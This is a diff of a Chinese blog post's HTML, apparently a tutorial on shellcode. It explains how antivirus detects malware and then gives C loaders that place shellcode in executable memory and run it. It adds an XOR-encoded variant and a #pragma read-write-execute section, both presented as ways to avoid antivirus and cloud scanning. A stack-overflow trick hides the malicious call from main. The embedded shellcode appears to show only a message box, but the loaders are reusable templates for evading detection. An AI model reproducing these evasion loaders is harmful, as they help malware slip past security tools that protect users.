@@ -284,7 +284,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>8.9k</span>
+      <span>8.7k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -310,38 +310,7 @@
 <p>我们知道在PE文件中的.text段存放的是可执行代码，而杀毒软件会将其内容读取出来，并进行程序特征提取，判断可执行代码中是否存在病毒的特征，有的话就确定该程序存在病毒。</p>
 <p>这也就是为什么病毒还未运行就被发现的原因。</p>
 <h2 id="基于病毒的行为进行甄别"><a href="#基于病毒的行为进行甄别" class="headerlink" title="基于病毒的行为进行甄别"></a>基于病毒的行为进行甄别</h2><p>主要是针对病毒行为的敏感操作，当病毒想干坏事的时候，难免会调用API，当出现比较敏感的操作时，确定该程序为病毒。</p>
-<h1 id="0x03-一个简单的Loader"><a href="#0x03-一个简单的Loader" class="headerlink" title="0x03-一个简单的Loader"></a>0x03-一个简单的Loader</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;
-#include&lt;stdio.h&gt;
-
-unsigned char  shellcode[] =
-"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
-"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
-"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
-"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
-"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
-"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
-"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
-"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
-"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
-"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
-"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
-int main()
-{
-	//分配内存，并设置为可读可写可执行，大小为shellcode的大小
-	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-	if (Memory == NULL)//当开辟失败时，直接结束
-	{
-		return 1;
-	}
-	//将shellcode复制到内存中
-	memcpy(Memory, shellcode, sizeof(shellcode));
-	/*DWORD dold;
-	VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);*/
-
-	//强制转换为函数
-	((void(*)())Memory)();
-	return 0;
-}</code></pre>
+<h1 id="0x03-一个简单的Loader"><a href="#0x03-一个简单的Loader" class="headerlink" title="0x03-一个简单的Loader"></a>0x03-一个简单的Loader</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">	LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">	{</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">//将shellcode复制到内存中</span></span><br><span class="line">	<span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">	<span class="comment">/*DWORD dold;</span></span><br><span class="line"><span class="comment">	VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//强制转换为函数</span></span><br><span class="line">	((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>运行时会直接弹出消息框</p>
 <p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649555515604.png"></p>
@@ -351,12 +320,7 @@ int main()
 <blockquote>
 <p>0xC000005报错表示内存访问的属性问题</p>
 </blockquote>
-<pre class="language-c" data-language="c"><code class="language-c">BOOL VirtualProtect(
-  [in]  LPVOID lpAddress,
-  [in]  SIZE_T dwSize,
-  [in]  DWORD  flNewProtect,
-  [out] PDWORD lpflOldProtect
-);</code></pre>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
 
 <p>第一个参数是地址起始位置</p>
 <p>第二个参数是需要改变的内存大小</p>
@@ -369,90 +333,10 @@ int main()
 <h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>不知道为什么使用这种方法在VS会报错-无法强制转换</p>
 <p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556539202.png"></p>
 <h1 id="0x05-更进一步"><a href="#0x05-更进一步" class="headerlink" title="0x05-更进一步"></a>0x05-更进一步</h1><p>因为上一步将内存的属性修改并执行，那么一定会审计我们的shellcode，如果shellcode存在恶意的行为，很快就会被辨别出来，所以我们要对其进行加密，使其无法被识别。当然要注意要进行解密操作。</p>
-<pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;
-#include&lt;stdio.h&gt;
-#pragma data_seg("vdata")
-
-unsigned char  shellcode[] =
-"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
-"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
-"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
-"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
-"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
-"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
-"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
-"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
-"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
-"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
-"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
-#pragma data_seg()//创建段，名称为vdata
-#pragma comment(linker,"/SECTION:vdata,RWE")//修改段的属性
-
-int main()
-{
-	//加密函数
-	for (int i = 0; i &lt; sizeof(shellcode); ++i)
-	{
-		shellcode[i] ^= 0x23;
-	}
-	//分配内存，并设置为可读可写可执行，大小为shellcode的大小
-	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-	if (Memory == NULL)//当开辟失败时，直接结束
-	{
-		return 1;
-	}
-	//将shellcode复制到内存中
-	memcpy(Memory, shellcode, sizeof(shellcode));
-	//解密函数
-	for (int i = 0; i &lt; sizeof(shellcode); ++i)
-	{
-		*((char*)Memory + i) ^= 0x23;
-	}
-
-	////DWORD dold;
-	////VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);
-
-	////强制转换为函数
-	((void(*)())Memory)();
-
-	return 0;
-}</code></pre>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"vdata"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()<span class="comment">//创建段，名称为vdata</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:vdata,RWE"</span>)<span class="comment">//修改段的属性</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//加密函数</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(shellcode); ++i)</span><br><span class="line">	{</span><br><span class="line">		shellcode[i] ^= <span class="number">0x23</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">	LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">	{</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">//将shellcode复制到内存中</span></span><br><span class="line">	<span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">	<span class="comment">//解密函数</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(shellcode); ++i)</span><br><span class="line">	{</span><br><span class="line">		*((<span class="keyword">char</span>*)Memory + i) ^= <span class="number">0x23</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">////DWORD dold;</span></span><br><span class="line">	<span class="comment">////VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">////强制转换为函数</span></span><br><span class="line">	((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>因为杀毒软件可能将代码上传到云端跑（因为存在一些敏感行为，VirtualProtect等），这时候我们的shellcode可能被识别，所以我们要避免VirtualProtect操作，那么如何创建可读可写可执行的段呢。这时候就用到了预处理#pragma</p>
-<pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;
-#include&lt;stdio.h&gt;
-#pragma data_seg("vdata")
-unsigned char  shellcode[] =
-"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
-"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
-"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
-"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
-"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
-"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
-"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
-"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
-"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
-"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
-"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
-#pragma data_seg()//创建段，名称为vdata
-#pragma comment(linker,"/SECTION:vdata,RWE")//修改段的属性
-int main()
-{
-	//分配内存，并设置为可读可写可执行，大小为shellcode的大小
-	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-	if (Memory == NULL)//当开辟失败时，直接结束
-	{
-		return 1;
-	}
-	//将shellcode复制到内存中
-	memcpy(Memory, shellcode, sizeof(shellcode));
-	//DWORD dold;
-	//VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);
-
-	//强制转换为函数
-	((void(*)())Memory)();
-	return 0;
-}</code></pre>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"vdata"</span>)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()<span class="comment">//创建段，名称为vdata</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:vdata,RWE"</span>)<span class="comment">//修改段的属性</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">	LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">	{</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">//将shellcode复制到内存中</span></span><br><span class="line">	<span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">	<span class="comment">//DWORD dold;</span></span><br><span class="line">	<span class="comment">//VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//强制转换为函数</span></span><br><span class="line">	((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 <h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649557566937.png"></p>
 <h1 id="0x06-栈溢出"><a href="#0x06-栈溢出" class="headerlink" title="0x06-栈溢出"></a>0x06-栈溢出</h1><h2 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h2><p>首先要先了解X86栈和函数调用的机制</p>
@@ -462,25 +346,7 @@ int main()
 </blockquote>
 <p>所以我们可以通过数组越界覆盖ret原本的地址</p>
 <p>代码</p>
-<pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;
-#include&lt;Windows.h&gt;
-#include&lt;iostream&gt;
-//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
-void Decshellcode()
-{
-	//完成恶意代码的释放、解密、执行
-	MessageBoxA(0, "不要再打了", "我错了", MB_OK);
-}
-#pragma optimize("",off)
-int main()
-{
-	int a = 2022;//0
-	int arr[2] = { 1,2 };//1,2
-	int ti = 23;//3
-	arr[5] = (int)Decshellcode;
-	return 0;
-}
-#pragma optimize("",on)</code></pre>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//完成恶意代码的释放、解密、执行</span></span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打了"</span>, <span class="string">"我错了"</span>, MB_OK);</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">2022</span>;<span class="comment">//0</span></span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };<span class="comment">//1,2</span></span><br><span class="line">	<span class="keyword">int</span> ti = <span class="number">23</span>;<span class="comment">//3</span></span><br><span class="line">	arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578699864.png"></p>
 <p>这里会先把0xD61212压入栈中</p>
@@ -494,29 +360,13 @@ int main()
 <p>可以看到这里是不一样的，数组下标小的元素在低地址，所以可以通过数组越界覆盖原本压入的call下一条地址</p>
 <p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579335339.png"></p>
 <p>arr[0]是首元素，那么arr[5]对应的就是ret的地址</p>
-<pre class="language-c" data-language="c"><code class="language-c">arr[5] = (int)Decshellcode;</code></pre>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br></pre></td></tr></tbody></table></figure>
 
 <p>将shellcode的地址覆盖ret的地址</p>
 <p>注意要有一个值占用arr[4]的值，或者直接使用arr[4]访问即可。</p>
 <h2 id="分析利用"><a href="#分析利用" class="headerlink" title="分析利用"></a>分析利用</h2><p>因为在Main函数中执行恶意代码是很容易被察觉的，所以我们要阻断Main函数和恶意代码的联系</p>
 <p>我们需要做到既不调用函数，又能让函数执行，即栈溢出</p>
-<pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;
-#include&lt;Windows.h&gt;
-void Decshellcode()
-{
-	//完成恶意代码的释放、解密、执行
-	MessageBoxA(0, "不要再打了", "我错了", MB_OK);
-}
-#pragma optimize("",off)
-int main()
-{
-	int a = 2022;
-	int arr[2] = { 1,2 };
-	int ti = 23;
-	arr[5] = (int)Decshellcode;
-	//return 0;
-}
-#pragma optimize("",on)</code></pre>
